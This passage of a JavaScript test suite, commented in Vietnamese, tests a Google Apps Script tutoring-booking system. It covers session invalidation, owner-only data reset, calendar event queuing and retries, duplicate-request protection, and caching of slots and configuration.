  assert.ok(k.ok && k.data.count === 1, JSON.stringify(k));
  assert.strictEqual(api.apiStudentHome(stok).reason, 'SESSION_INVALID');
  assert.strictEqual(api.apiAdminLogoutUser(atok, 'A01').reason, 'NOT_FOUND', 'không dùng cho admin');
  assert.strictEqual(api.apiAdminLogoutUser(tokenFor(c, 'S003'), 'S005').reason, 'FORBIDDEN');
  // Tranh chấp: một lần gọi đọc AUTH (phiên còn hạn) ngay trước khi thoát, rồi ghi bộ đệm SAU khi thoát
  const t3 = tokenFor(c, 'T003');
  const h = api.sha256Hex_(t3), stale = JSON.stringify({ uid: 'T003', exp: Date.now() + 86400000, ct: Date.now() - 50 });
  api.logoutAll_(api.userById_('T003'), 'test');
  env.state.cache[api.sessionCacheKey_(h)] = stale;
  assert.strictEqual(api.apiTutorHome(t3).reason, 'SESSION_INVALID', 'bộ đệm cũ bị bỏ nhờ mốc thoát');
  cfgSet(c, 'SESSION_CACHE_SECONDS', '999999');
  assert.strictEqual(api.sessionCacheSeconds_(), 21600, 'không vượt giới hạn 6 giờ của CacheService');
});

t('I55', 'Dán code mới nhưng CHƯA chạy menu 1: thiếu cột AUTH.device vẫn đăng nhập được; thiếu tab NOTIFICATIONS vẫn đặt và huỷ được', () => {
  const c = mk(), { api, env } = c;
  const ss = env.state.spreadsheets.DB_STAGING_TEST;
  ss.sheets.AUTH.values = ss.sheets.AUTH.values.map(r => r.slice(0, 7));   // bỏ cột device
  api.clearDbCache_();
  const tok = tokenFor(c, 'S003', UA_WIN);
  assert.ok(api.apiStudentHome(tok).ok);
  assert.ok(api.listSessions_('S003', '').length === 1);
  delete ss.sheets.NOTIFICATIONS; api.clearDbCache_();
  const r = api.apiStudentBook(tok, [{ date: K(14, 10), slot: '19:00' }]);
  assert.ok(r.ok && r.data[0].ok, JSON.stringify(r));
  assert.ok(api.apiStudentCancel(tok, r.data[0].bookingId).ok);
  assert.ok(c.mailsTo(EMAIL.ADMIN).some(m => /huỷ buổi/.test(m.htmlBody)), 'email admin vẫn đi');
});

t('I56', 'Khoá menu xoá theo môi trường: cài đặt STAGING ghi ALLOW_DATA_RESET TRUE; switchToProduction ghi FALSE; PRODUCTION chỉ chủ file được xoá; nhắc 8:00 cũ (8) tự đổi -1 đúng một lần', () => {
  const { api, env } = freshEnv();
  api.setupFirstRun(); api.clearDbCache_(); api.clearConfigCache_();
  assert.strictEqual(api.cfg_('ALLOW_DATA_RESET'), true);
  assert.strictEqual(api.cfg_('MORNING_REMINDER_HOUR'), -1);
  // File cũ (bản 5B, 5C) có MORNING_REMINDER_HOUR = 8: lần cài đặt đầu đổi -1; admin bật lại 8 thì lần sau giữ nguyên
  delete env.state.props.MIG_MORNING_OFF;
  api.withLock_(() => { const t = api.table_('CONFIG'); t.update(t.byId('MORNING_REMINDER_HOUR'), { value: '8' }); });
  api.setupFirstRun(); api.clearDbCache_(); api.clearConfigCache_();
  assert.strictEqual(api.cfg_('MORNING_REMINDER_HOUR'), -1);
  api.withLock_(() => { const t = api.table_('CONFIG'); t.update(t.byId('MORNING_REMINDER_HOUR'), { value: '8' }); });
  api.setupFirstRun(); api.clearDbCache_(); api.clearConfigCache_();
  assert.strictEqual(api.cfg_('MORNING_REMINDER_HOUR'), 8, 'admin chủ động bật lại thì giữ');
  api.switchToProduction(); api.clearDbCache_(); api.clearConfigCache_();
  assert.strictEqual(api.cfg_('ALLOW_DATA_RESET'), false);
  api.withLock_(() => { const t = api.table_('CONFIG'); t.update(t.byId('ALLOW_DATA_RESET'), { value: 'TRUE' }); }); api.clearConfigCache_();
  env.state.drive.files.NEW_DB = { id: 'NEW_DB', name: 'THAIPUT_DB', owner: env.state.effectiveUserEmail, created: new Date(0) };   // file thật luôn có chủ
  env.state.activeUserEmail = 'admin.khac@gmail.com';
  api.withLock_(() => api.table_('USERS').insert({ user_id: 'A09', role: 'ADMIN', email: 'admin.khac@gmail.com', name: 'Co-founder', status: 'ACTIVE' }));
  assert.ok(/chỉ chủ file/.test(api.resetTestData_('KEEP_TUTORS', 'XOA DU LIEU PRODUCTION MUC 1', 'admin.khac@gmail.com').error));
});

t('I57', 'Huỷ và đổi tutor: khách admin (co-founder) được gỡ không gửi thư trước khi gửi thư huỷ, thư đổi tutor; sau đổi tutor admin được thêm lại không gửi thư', () => {
  const c = mk(), { api } = c;
  const [r] = c.book('S003', [[K(14, 10), '19:00']]);
  const ev = c.row('BOOKINGS', r.bookingId).event_id;
  assert.ok(c.calls('patch').some(x => x.id === ev && x.attendees.indexOf('admin.karn@gmail.com') !== -1), 'co-founder là khách');
  const n0 = c.calls().length;
  api.adminReassignBooking_(r.bookingId, 'admin.karn@gmail.com', '');
  const seq = c.calls().slice(n0).filter(x => x.id === ev && (x.op === 'patch' || x.op === 'remove'));
  const allMails = seq.filter(x => x.sendUpdates === 'all');
  assert.ok(allMails.length >= 1 && allMails.every(x => (x.attendees || []).indexOf('admin.karn@gmail.com') === -1), 'lượt gửi thư không có admin: ' + JSON.stringify(seq));
  // Gỡ admin bằng lượt KHÔNG gửi thư trước lượt gửi thư (nếu lượt gửi thư tự gỡ admin, Google gửi thư huỷ cho admin)
  const firstAll = seq.findIndex(x => x.sendUpdates === 'all');
  assert.ok(seq.slice(0, firstAll).some(x => x.op === 'patch' && x.sendUpdates === 'none' && x.attendees.indexOf('admin.karn@gmail.com') === -1), 'gỡ admin không gửi thư trước: ' + JSON.stringify(seq));
  assert.ok(seq[seq.length - 1].sendUpdates === 'none' && seq[seq.length - 1].attendees.indexOf('admin.karn@gmail.com') !== -1, 'thêm lại admin không gửi thư');
  const n1 = c.calls().length;
  api.adminCancelBooking_(r.bookingId, 'admin.karn@gmail.com', 'test');
  const seq2 = c.calls().slice(n1).filter(x => x.id === ev);
  const rm = seq2.findIndex(x => x.op === 'remove');
  assert.ok(rm > 0 && seq2[rm - 1].op === 'patch' && seq2[rm - 1].sendUpdates === 'none' && seq2[rm - 1].attendees.indexOf('admin.karn@gmail.com') === -1, JSON.stringify(seq2));
});

t('I58', 'purgeRows_: insert và update trong cùng khoá sau khi dọn vẫn ghi đúng hàng; dòng giữ lại còn nguyên', () => {
  const c = mk(), { api } = c;
  api.withLock_(() => {
    const t = api.table_('AUTH');
    t.insert({ token_hash: 'x1', user_id: 'S003', kind: 'LINK', expires_at: new Date(2026, 0, 1), created_at: new Date(2026, 0, 1) });
    t.insert({ token_hash: 'x2', user_id: 'S003', kind: 'LINK', expires_at: new Date(2027, 0, 1), created_at: new Date(2026, 0, 1) });
  });
  api.withLock_(() => {
    const t = api.table_('AUTH');
    assert.strictEqual(api.purgeRows_('AUTH', a => a.token_hash !== 'x1'), 1);
    t.insert({ token_hash: 'x3', user_id: 'S005', kind: 'LINK', expires_at: new Date(2027, 0, 1), created_at: new Date(2026, 0, 1) });
    t.update(t.byId('x2'), { use_count: 5 });
  });
  const rows = c.rows('AUTH');
  assert.deepStrictEqual(rows.map(r => r.token_hash), ['x2', 'x3']);
  assert.strictEqual(Number(rows[0].use_count), 5);
});

t('I59', 'Endpoint công khai không lấy khoá với đầu vào sai: link lạ, thoát với mã lạ, xin link cho email không có; 20 form đăng ký rác không làm khoá form của người thật', () => {
  const c = mk(), { api, env } = c;
  const l0 = env.state.lockCalls;
  assert.strictEqual(api.apiExchangeToken('ab'.repeat(32), UA_WIN).reason, 'LINK_INVALID');
  assert.ok(api.apiLogout('cd'.repeat(32)).ok);
  assert.ok(api.apiRequestLogin('khong.co@x.vn').ok, 'cùng một câu cho email không có');
  assert.strictEqual(env.state.lockCalls, l0, 'không lấy khoá cho đầu vào lạ');
  for (let i = 0; i < 25; i++) assert.notStrictEqual(api.apiSubmitRegistration({ email: 'x' }).reason, 'RATE_LIMITED', 'form rác bị từ chối vì sai dữ liệu, không vì hạn mức');
  const ok = api.apiSubmitRegistration(c.form({ email: 'that@test.vn' }));
  assert.ok(ok.ok, 'người thật vẫn gửi được: ' + JSON.stringify(ok));
});

t('I60', 'Sửa sau lượt soát 2: khoá tài khoản trong USERS thoát mọi thiết bị ngay; gỡ khách admin cả khi đã tắt ADMIN_JOIN_MEET; chủ file không xác định thì từ chối; ô CONTENT "-" ẩn chữ trong email; cảnh báo link không https; huỷ lại báo rõ; đặt thay cho học viên không có gói báo trước; danh sách học viên hiện gói đang dùng', () => {
  const c = mk(), { api, env } = c;
  // 1. onEdit USERS.status = DISABLED
  const t2 = tokenFor(c, 'T002'); api.apiTutorHome(t2);
  api.withLock_(() => api.table_('USERS').update(api.userById_('T002'), { status: 'DISABLED' }));
  const ed = api.handleAdminEdit_('USERS', 'status', 'T002', 'DISABLED', 'admin.karn@gmail.com');
  assert.ok(ed && ed.ok && /thoát 1 thiết bị/.test(ed.message), JSON.stringify(ed));
  api.withLock_(() => api.table_('USERS').update(api.userById_('T002'), { status: 'ACTIVE' }));
  assert.strictEqual(api.apiTutorHome(t2).reason, 'SESSION_INVALID', 'mở lại ngay cũng không sống lại');
  // 2. Đổi cài đặt sau khi đặt: admin vẫn được gỡ trước thư huỷ
  c.onlyOpen(K(14, 10), '19:00', ['T001']);
  const [b] = c.book('S003', [[K(14, 10), '19:00']]);
  const ev = c.row('BOOKINGS', b.bookingId).event_id;
  cfgSet(c, 'ADMIN_JOIN_MEET', 'FALSE');
  const n0 = c.calls().length;
  api.adminCancelBooking_(b.bookingId, 'admin.karn@gmail.com', 'x');
  const seq = c.calls().slice(n0).filter(x => x.id === ev), rm = seq.findIndex(x => x.op === 'remove');
  assert.ok(rm > 0 && seq[rm - 1].sendUpdates === 'none' && seq[rm - 1].attendees.indexOf('admin.karn@gmail.com') === -1, JSON.stringify(seq));
  // 3. Chủ file không xác định (file trong Bộ nhớ dùng chung): từ chối
  const own = env.state.drive.files.DB_STAGING_TEST;
  env.state.activeSpreadsheetId = 'DB_STAGING_TEST';
  const saved = own.owner; own.owner = null;
  const realGet = env.globals.DriveApp.getFileById;
  env.globals.DriveApp.getFileById = (id) => { const f = realGet(id); return Object.assign({}, f, { getOwner: () => null }); };
  assert.throws(() => api.requireOwner_(), /Không xác định được chủ file/);
  env.globals.DriveApp.getFileById = realGet; own.owner = saved;
  // 4. Ô CONTENT "-" = cố ý để trống, kể cả chữ dùng trong email
  setContent(c, 'a.via_link', '-'); api.refreshContent_();
  assert.strictEqual(api.contentText_('a.via_link'), '');
  // 5. Link CONFIG không https: testSystem báo trước
  cfgSet(c, 'ADMIN_ZALO_URL', 'zalo.me/0909');
  assert.ok(api.testSystem().warnings.some(w => /ADMIN_ZALO_URL không bắt đầu bằng https/.test(w)));
  // 6. Huỷ lại buổi đã huỷ: câu rõ ràng
  const atok = tokenFor(c, 'A01');
  assert.ok(/đã được huỷ trước đó/.test(api.apiAdminCancel(atok, b.bookingId, '').message));
  // 7. Học viên không có gói: báo trước khi chọn slot; lý do viết cho admin
  api.withLock_(() => api.table_('USERS').insert({ user_id: 'S0099', role: 'STUDENT', email: 'nopkg@x.vn', name: 'Chưa có gói', status: 'ACTIVE' }));
  const sl = api.apiAdminSlots(atok, 'S0099', K(14, 10), 2);
  assert.ok(sl.ok && sl.blocker === 'NO_PACKAGE' && /chưa có gói/.test(sl.blockerMsg.vi) && /no usable package/.test(sl.blockerMsg.en), JSON.stringify(sl.blockerMsg));
  const bk = api.apiAdminBook(atok, 'S0099', [{ date: K(15, 10), slot: '20:00' }]).data[0];
  assert.ok(!bk.ok && /Học viên chưa có gói/.test(bk.message), bk.message);
  // 8. Học viên có gói hết hạn và gói đang dùng: danh sách hiện gói đang dùng (ACTIVE = 0 không bị coi là sai)
  api.withLock_(() => api.table_('STUDENT_PACKAGES').insert({ sp_id: 'SP09999', student_id: 'S003', package_code: 'PASS_2W', status: 'EXPIRED', start_date: new Date(2026, 8, 1), end_date: new Date(2026, 8, 14), purchased_at: new Date(2026, 8, 1) }));
  const s3 = api.apiAdminPeople(atok).data.students.find(x => x.id === 'S003');
  assert.strictEqual(s3.pkg.status, 'ACTIVE', JSON.stringify(s3.pkg));
});

// ═══ Chunk 5F: chống nghẽn, hàng đợi Calendar, an toàn dữ liệu ═══
const RAW = (c, table) => c.env.state.spreadsheets.DB_STAGING_TEST.sheets[table].values;
function spyOpen(c) { const g = c.env.globals.SpreadsheetApp, ro = g.openById; const s = { n: 0, restore: () => { g.openById = ro; } }; g.openById = (id) => { s.n++; return ro(id); }; return s; }

t('I61', 'Calendar gom ban đêm (NIGHTLY, dự phòng; mặc định QUEUE từ 16/10): đặt không gọi Calendar, email xác nhận báo link đến cùng lời mời; job trước 23:00 thoát không mở Sheets; từ 23:00 tạo đủ, chạy lại không trùng', () => {
  const c = mk(), { api } = c;
  cfgSet(c, 'CALENDAR_MODE', 'NIGHTLY');
  assert.strictEqual(api.DEFAULTS_.CALENDAR_MODE, 'QUEUE', 'mặc định trong code là QUEUE (16/10)');
  const ins0 = c.calls('insert').length;
  const r = c.book('S003', [[K(13, 10), '19:00'], [K(14, 10), '19:00']]);
  assert.ok(r.every(x => x.ok), JSON.stringify(r));
  assert.strictEqual(c.calls('insert').length, ins0, 'không gọi Calendar khi đặt');
  const b = c.row('BOOKINGS', r[0].bookingId);
  assert.strictEqual(b.cal_state, 'PENDING'); assert.strictEqual(b.event_id, '');
  const conf = c.mailsTo(EMAIL.S003).filter(m => /Xác nhận|đặt/i.test(m.subject)).slice(-1)[0];
  assert.ok(conf && /lời mời Google Calendar/.test(conf.htmlBody), 'email xác nhận nói rõ link Meet đến sau');
  c.at('2026-10-12 12:00');
  api.createTriggers_({});
  const trig = c.env.state.triggers.find(x => x.fn === 'calendarJob');
  assert.ok(trig, 'có trigger calendarJob');
  api.clearDbCache_();
  const spy = spyOpen(c);
  const idle = api.calendarJob({ triggerUid: trig.getUniqueId() });   // đúng như trigger thật gọi
  spy.restore();
  assert.ok(idle.idle, JSON.stringify(idle)); assert.strictEqual(spy.n, 0, 'chưa tới giờ: không mở Sheets');
  c.at('2026-10-12 23:05');
  const run = api.calendarJob();
  assert.strictEqual(run.created, 2, JSON.stringify(run));
  const evs = c.calls('insert').slice(ins0);
  assert.ok(evs.length === 2 && evs.every(x => x.sendUpdates === 'all' && /^tp[0-9a-f]{30}$/.test(x.id)), 'mã sự kiện cố định, gửi thư mời');
  const b2 = c.row('BOOKINGS', r[0].bookingId);
  assert.strictEqual(b2.cal_state, 'CREATED'); assert.ok(b2.event_id && b2.meet_link);
  c.at('2026-10-12 23:10');
  const again = api.runCalendarQueue_({ force: true });
  assert.strictEqual(again.created, 0); assert.strictEqual(c.calls('insert').length, ins0 + 2, 'không tạo trùng');
});

t('I62', 'Đường gấp: buổi tối nay do admin đặt thay lúc 16:00, và buổi trong giờ yên tĩnh của QUEUE, được tạo sự kiện ngay khi đặt, email có link Meet', () => {
  const c = mk('2026-10-12 16:00'), { api } = c;
  cfgSet(c, 'CALENDAR_MODE', 'NIGHTLY');
  c.onlyOpen(K(12, 10), '20:00', ['T001']);
  const ins0 = c.calls('insert').length;
  const r = api.bookSessionsFor_('S003', [{ date: K(12, 10), slot: '20:00' }], 'admin@thaiput.vn', { override: true });
  assert.ok(r[0].ok, JSON.stringify(r));
  assert.strictEqual(c.calls('insert').length, ins0 + 1, 'tạo ngay, không chờ 23:00');
  const b = c.row('BOOKINGS', r[0].bookingId);
  assert.strictEqual(b.cal_state, 'CREATED'); assert.ok(b.meet_link);
  assert.ok(r[0].meetLink && c.mailsTo(EMAIL.S003).slice(-1)[0].htmlBody.indexOf(r[0].meetLink) !== -1, 'email xác nhận có link Meet');
  // QUEUE, 22:30 (giờ yên tĩnh 22 đến 7): buổi 08:00 sáng mai cần trước 05:00 nên tạo ngay; buổi ngày kia chờ 07:00
  cfgSet(c, 'CALENDAR_MODE', 'QUEUE'); c.at('2026-10-12 22:30');
  c.onlyOpen(K(13, 10), '08:00', ['T002']);
  const u = api.bookSessionsFor_('S005', [{ date: K(13, 10), slot: '08:00' }], 'admin@thaiput.vn', { override: true });
  assert.ok(u[0].ok && c.row('BOOKINGS', u[0].bookingId).cal_state === 'CREATED', 'buổi sáng sớm: tạo ngay');
  const n = api.bookSessionsFor_('S007', [{ date: K(14, 10), slot: '19:00' }], 'admin@thaiput.vn', { override: true });
  assert.strictEqual(c.row('BOOKINGS', n[0].bookingId).cal_state, 'PENDING');
  c.at('2026-10-12 23:30'); assert.ok(api.calendarJob().idle, 'giờ yên tĩnh: không gửi lời mời ban đêm');
  c.at('2026-10-13 07:05'); assert.strictEqual(api.calendarJob().created, 1);
  assert.strictEqual(c.row('BOOKINGS', n[0].bookingId).cal_state, 'CREATED');
});

t('I63', 'Huỷ: chưa tạo sự kiện thì không gọi Google (SKIPPED); đã tạo thì gỡ sau khi nhả khoá (CANCELLED); gỡ lỗi thì hàng đợi gỡ lại', () => {
  const c = mk(), { api, env } = c;
  cfgSet(c, 'CALENDAR_MODE', 'NIGHTLY');
  const p = c.book('S003', [[K(14, 10), '19:00']])[0];
  const rm0 = c.calls('remove').length;
  assert.ok(api.cancelBookingFor_('S003', p.bookingId, EMAIL.S003).ok);
  assert.strictEqual(c.calls('remove').length, rm0, 'không gọi Calendar');
  assert.strictEqual(c.row('BOOKINGS', p.bookingId).cal_state, 'SKIPPED');
  cfgSet(c, 'CALENDAR_MODE', 'INLINE');
  const held = [], realRm = env.globals.Calendar.Events.remove;
  env.globals.Calendar.Events.remove = (cal, id, o) => { held.push(!!env.state.lockHeld); return realRm(cal, id, o); };
  const q = c.book('S005', [[K(15, 10), '19:00']])[0];
  assert.strictEqual(c.row('BOOKINGS', q.bookingId).cal_state, 'CREATED');
  assert.ok(api.cancelBookingFor_('S005', q.bookingId, EMAIL.S005).ok);
  assert.deepStrictEqual(held, [false], 'gỡ sự kiện khi KHÔNG giữ khoá');
  assert.strictEqual(c.row('BOOKINGS', q.bookingId).cal_state, 'CANCELLED');
  assert.ok(c.calls('remove').slice(-1)[0].sendUpdates === 'all', 'khách nhận thư huỷ');
  const w = c.book('S007', [[K(16, 10), '19:00']])[0];
  env.state.calendarRemoveFailNext = 1;
  assert.ok(api.cancelBookingFor_('S007', w.bookingId, EMAIL.S007).ok, 'Calendar lỗi không làm hỏng việc huỷ');
  const f = c.row('BOOKINGS', w.bookingId);
  assert.strictEqual(f.cal_state, 'CANCEL_PENDING'); assert.strictEqual(Number(f.cal_attempts), 1);
  const res = api.runCalendarQueue_({ force: true });
  assert.strictEqual(res.removed, 1, JSON.stringify(res));
  assert.strictEqual(c.row('BOOKINGS', w.bookingId).cal_state, 'CANCELLED');
  env.globals.Calendar.Events.remove = realRm;
});

t('I64', 'Mã sự kiện cố định: lần trước đã tạo trên Google nhưng chưa ghi được mã thì lần sau dùng lại, không tạo sự kiện thứ hai, không gửi thư mời lần hai; huỷ vẫn gỡ đúng sự kiện', () => {
  const c = mk(), { api } = c;
  const r = c.book('S003', [[K(13, 10), '19:00']])[0];
  const b = c.row('BOOKINGS', r.bookingId), ev = b.event_id;
  assert.strictEqual(ev, api.lessonEventId_(b));
  api.withLock_(() => { const t = api.table_('BOOKINGS'); t.update(t.byId(r.bookingId), { event_id: '', meet_link: '', cal_state: 'PENDING', cal_attempts: 1, cal_next_at: '' }); });
  const ins0 = c.calls('insert').length;
  const res = api.runCalendarQueue_({ force: true });
  assert.strictEqual(res.created, 1, JSON.stringify(res));
  assert.strictEqual(c.calls('insert').length, ins0, 'không có sự kiện mới, không thư mời mới');
  assert.strictEqual(c.row('BOOKINGS', r.bookingId).event_id, ev);
  assert.ok(c.row('BOOKINGS', r.bookingId).meet_link, 'lấy lại link Meet của sự kiện cũ');
  // Mất mã lần nữa rồi học viên huỷ: vẫn gỡ đúng sự kiện theo mã cố định
  api.withLock_(() => { const t = api.table_('BOOKINGS'); t.update(t.byId(r.bookingId), { event_id: '', cal_state: 'PENDING', cal_attempts: 1 }); });
  assert.ok(api.cancelBookingFor_('S003', r.bookingId, EMAIL.S003).ok);
  assert.ok(c.calls('remove').some(x => x.id === ev), 'gỡ theo mã cố định');
  assert.strictEqual(c.row('BOOKINGS', r.bookingId).cal_state, 'CANCELLED');
});

t('I65', 'Calendar lỗi: thử lại có chờ tăng dần; quá CALENDAR_MAX_ATTEMPTS lần thì FAILED và báo admin mức Khẩn đúng 1 lần', () => {
  const c = mk(), { api, env } = c;
  cfgSet(c, 'CALENDAR_MODE', 'NIGHTLY');
  const r = c.book('S003', [[K(13, 10), '19:00']])[0];
  env.state.calendarFailNext = 99;
  c.at('2026-10-12 23:00');
  api.runCalendarQueue_({});
  let b = c.row('BOOKINGS', r.bookingId);
  assert.strictEqual(b.cal_state, 'PENDING'); assert.strictEqual(Number(b.cal_attempts), 1);
  assert.strictEqual(new Date(b.cal_next_at).getTime(), new Date(2026, 9, 12, 23, 5).getTime(), 'lần sau sau 5 phút');
  c.at('2026-10-12 23:02'); assert.strictEqual(api.runCalendarQueue_({ force: false }).created || 0, 0);
  assert.strictEqual(Number(c.row('BOOKINGS', r.bookingId).cal_attempts), 1, 'chưa tới hạn thử lại thì không gọi');
  for (let i = 0; i < 4; i++) api.runCalendarQueue_({ force: true });
  b = c.row('BOOKINGS', r.bookingId);
  assert.strictEqual(b.cal_state, 'FAILED'); assert.strictEqual(Number(b.cal_attempts), 5);
  const n = c.rows('NOTIFICATIONS').filter(x => x.event === 'CALENDAR_FAILED');
  assert.strictEqual(n.length, 1); assert.strictEqual(n[0].level, 'CRITICAL');
  api.runCalendarQueue_({ force: true });
  assert.strictEqual(c.rows('NOTIFICATIONS').filter(x => x.event === 'CALENDAR_FAILED').length, 1, 'FAILED không thử lại, không báo lại');
  env.state.calendarFailNext = 0;
});

t('I66', 'Chống gửi trùng: cùng mã yêu cầu thì đặt đúng 1 lần, kể cả khi bộ đệm mất (mã lưu ở BOOKINGS); huỷ và đổi link đăng nhập gửi lại cùng mã nhận lại kết quả cũ', () => {
  const c = mk(), { api, env } = c;
  const tok = tokenFor(c, 'S003'), reqs = [{ date: K(13, 10), slot: '19:00' }, { date: K(14, 10), slot: '19:00' }];
  const a = api.apiStudentBook(tok, reqs, 'rid_book_0001');
  const n1 = c.rows('BOOKINGS').length;
  const b = api.apiStudentBook(tok, reqs, 'rid_book_0001');
  assert.ok(b.replay && b.data.every(x => x.ok));
  env.state.cache = {};   // bộ đệm Google bị xoá sớm
  const d = api.apiStudentBook(tok, reqs, 'rid_book_0001');
  assert.deepStrictEqual(d.data.map(x => x.bookingId).sort(), a.data.map(x => x.bookingId).sort(), 'trả lại đúng các buổi cũ');
  assert.strictEqual(c.rows('BOOKINGS').length, n1, 'không thêm dòng');
  assert.strictEqual(c.row('BOOKINGS', a.data[0].bookingId).request_id, 'rid_book_0001');
  const e = api.apiStudentBook(tok, [reqs[0]], 'rid_book_0002');
  assert.strictEqual(e.data[0].reason, 'ONE_PER_DAY', 'mã mới là lần đặt mới');
  assert.ok(api.apiStudentCancel(tok, a.data[0].bookingId, 'rid_cancel_01').ok);
  const again = api.apiStudentCancel(tok, a.data[0].bookingId, 'rid_cancel_01');
  assert.ok(again.ok && again.replay, 'huỷ gửi lại: vẫn báo đã huỷ');
  // Link đăng nhập dùng 1 lần (đặt TUTOR_LINK_MAX_USES 1; mặc định 5J là không giới hạn): mạng rớt sau khi máy chủ nhận,
  // lần thử lại cùng mã nhận đúng phiên đó
  cfgSet(c, 'TUTOR_LINK_MAX_USES', '1');
  const link = linkFor(c, 'T002');
  const x1 = api.apiExchangeToken(link, UA_WIN, 'rid_login_001'), x2 = api.apiExchangeToken(link, UA_WIN, 'rid_login_001');
  assert.ok(x1.ok && x2.ok && x2.data.sessionToken === x1.data.sessionToken);
  assert.strictEqual(api.apiExchangeToken(link, UA_WIN, 'rid_login_002').reason, 'LINK_USED', 'mã khác: link đã dùng');
  assert.ok(!api.validRequestId_('a b'), 'mã sai dạng bị bỏ qua');
});

t('I67', 'Sau khi booking đã ghi, lỗi phía sau (khoá bận, Gmail lỗi) không biến kết quả thành thất bại; hàng đợi tự gắn sự kiện đã tạo', () => {
  const c = mk(), { api, env } = c;
  const tok = tokenFor(c, 'S003');
  const realIns = env.globals.Calendar.Events.insert, realMail = env.globals.GmailApp.sendEmail;
  env.globals.Calendar.Events.insert = (res, cal, o) => { const ev = realIns(res, cal, o); env.state.lockBusy = true; return ev; };
  env.globals.GmailApp.sendEmail = () => { throw new Error('Service invoked too many times for one day: email'); };
  const r = api.apiStudentBook(tok, [{ date: K(13, 10), slot: '19:00' }], 'rid_post_0001');
  env.state.lockBusy = false; env.globals.Calendar.Events.insert = realIns; env.globals.GmailApp.sendEmail = realMail;
  assert.ok(r.ok && r.data[0].ok, 'học viên thấy đặt thành công: ' + JSON.stringify(r));
  const b = c.row('BOOKINGS', r.data[0].bookingId);
  assert.ok(b, 'booking đã ghi'); assert.strictEqual(b.event_id, '', 'mã sự kiện chưa kịp ghi (khoá bận)');
  const ins0 = c.calls('insert').length;
  const q = api.runCalendarQueue_({ force: true });
  assert.strictEqual(q.created, 1); assert.strictEqual(c.calls('insert').length, ins0, 'dùng lại sự kiện đã tạo');
  assert.ok(c.row('BOOKINGS', b.booking_id).event_id);
});

t('I68', 'Số lần lấy khoá: đặt lịch và huỷ mỗi việc tối đa 2 lần (trước 5F: 5 đến 7 lần); job nhắc gửi email khi không giữ khoá, gửi hỏng thì bỏ đánh dấu để gửi lại', () => {
  const c = mk(), { api, env } = c;
  cfgSet(c, 'CALENDAR_MODE', 'NIGHTLY');
  let l0 = env.state.lockCalls;
  const r = c.book('S003', [[K(13, 10), '19:00'], [K(14, 10), '19:00'], [K(15, 10), '19:00']]);
  assert.ok(env.state.lockCalls - l0 <= 2, 'đặt 3 buổi: ' + (env.state.lockCalls - l0) + ' lần');
  cfgSet(c, 'CALENDAR_MODE', 'INLINE');
  l0 = env.state.lockCalls;
  const u = c.book('S005', [[K(13, 10), '20:00']]);
  assert.ok(env.state.lockCalls - l0 <= 2, 'đặt có tạo sự kiện ngay: ' + (env.state.lockCalls - l0));
  l0 = env.state.lockCalls;
  api.cancelBookingFor_('S005', u[0].bookingId, EMAIL.S005);
  assert.ok(env.state.lockCalls - l0 <= 2, 'huỷ: ' + (env.state.lockCalls - l0));
  // Nhắc trước 60 phút: gửi ngoài khoá
  c.at('2026-10-13 18:00');
  const held = [], realMail = env.globals.GmailApp.sendEmail;
  env.globals.GmailApp.sendEmail = (...a) => { held.push(!!env.state.lockHeld); return realMail(...a); };
  assert.strictEqual(api.reminderJob(), 1);
  assert.ok(held.length === 2 && held.every(h => !h), 'gửi nhắc khi không giữ khoá: ' + JSON.stringify(held));
  assert.ok(c.row('BOOKINGS', r[0].bookingId).reminder_sent_at);
  env.globals.GmailApp.sendEmail = () => { throw new Error('Gmail lỗi'); };
  c.at('2026-10-14 18:00');
  assert.strictEqual(api.reminderJob(), 1);
  env.globals.GmailApp.sendEmail = realMail;
  assert.strictEqual(c.row('BOOKINGS', r[1].bookingId).reminder_sent_at, '', 'gửi hỏng: lần sau gửi lại');
});

t('I69', 'Danh sách slot dùng chung trong bộ đệm: lần xem thứ hai không tính lại; có người đặt hoặc tutor đổi lịch thì hết hiệu lực ngay; SLOT_CACHE_SECONDS = 0 tắt', () => {
  const c = mk(), { api } = c;
  const tok = tokenFor(c, 'S005');
  const has = (data, dk, s) => data.some(d => d.date === dk && d.slots.indexOf(s) !== -1);
  c.onlyOpen(K(14, 10), '21:00', ['T001']);
  assert.ok(has(api.apiStudentSlots(tok).data, K(14, 10), '21:00'));
  // Sửa thẳng ô trong Sheets (không qua code, không onEdit): bản đệm còn hiệu lực
  const av = RAW(c, 'AVAILABILITY'), cols = api.SCHEMA.AVAILABILITY.cols, i = av.findIndex(row => row[cols.indexOf('tutor_id')] === 'T001' && row[cols.indexOf('slot')] === '21:00' && api.dateKey_(row[cols.indexOf('date')]) === K(14, 10));
  av[i][cols.indexOf('status')] = 'CANCELLED';
  api.clearDbCache_();
  assert.ok(has(api.apiStudentSlots(tok).data, K(14, 10), '21:00'), 'dùng bản đệm');
  c.book('S003', [[K(13, 10), '19:00']]);   // ghi BOOKINGS qua code: đổi phiên bản slot
  assert.ok(!has(api.apiStudentSlots(tok).data, K(14, 10), '21:00'), 'hết hiệu lực sau khi có người đặt');
  av[i][cols.indexOf('status')] = 'OPEN';
  cfgSet(c, 'SLOT_CACHE_SECONDS', '0');
  assert.ok(has(api.apiStudentSlots(tok).data, K(14, 10), '21:00'), 'tắt bộ đệm: thấy ngay');
  // Mở cổng kèm slot: một lượt gọi
  const h = api.apiStudentHome(tok, { slots: true });
  assert.ok(Array.isArray(h.data.slots) && h.data.slots.length, 'cổng học viên có sẵn slot');
  assert.strictEqual(api.apiStudentHome(tok).data.slots, null);
});

t('I70', 'CONFIG đệm 60 giây: lần chạy mới không mở tab CONFIG; admin sửa tab CONFIG (onEdit) hoặc code ghi CONFIG thì có hiệu lực ngay', () => {
  const c = mk(), { api } = c;
  api.clearConfigCache_();
  assert.strictEqual(api.cfg_('SCHOOL_NAME'), 'thaiput');
  const cv = RAW(c, 'CONFIG'); let i = cv.findIndex(r => r[0] === 'SCHOOL_NAME');
  if (i === -1) { cv.push(['SCHOOL_NAME', 'thaiput', '']); i = cv.length - 1; }
  cv[i][1] = 'Thaiput Mới';
  api.clearConfigMemory_();
  assert.strictEqual(api.cfg_('SCHOOL_NAME'), 'thaiput', 'lần chạy mới dùng bản đệm');
  const sheet = { getName: () => 'CONFIG' };
  api.onEditInstallable({ range: { getSheet: () => sheet, getNumRows: () => 1, getNumColumns: () => 1 }, triggerUid: c.env.state.triggers.length ? '' : '' });
  api.clearConfigMemory_();
  assert.strictEqual(api.cfg_('SCHOOL_NAME'), 'Thaiput Mới', 'admin sửa tab: có hiệu lực ngay');
